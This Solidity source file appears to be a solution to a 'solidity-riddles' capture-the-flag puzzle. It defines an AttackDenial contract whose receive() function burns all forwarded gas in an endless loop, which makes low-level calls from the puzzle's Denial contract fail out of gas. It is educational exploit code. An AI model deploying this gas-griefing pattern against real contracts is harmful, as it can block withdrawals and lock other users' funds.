// SPDX-License-Identifier: MIT
pragma solidity >=0.8.15;

import {Denial} from "../solidity-riddles/Denial.sol";

/**
 * @title AttackDenial
 * @dev This contract demonstrates an attack on the Denial contract.
 * The attacker target contract intentionally consumes an all the forwarded amount of gas. Because low level .call forward all gas or set gas.
 * The call will fail due to an out-of-gas exception.
 */
contract AttackDenial {
    receive() external payable {
        while (gasleft() > 0) {}
    }
}
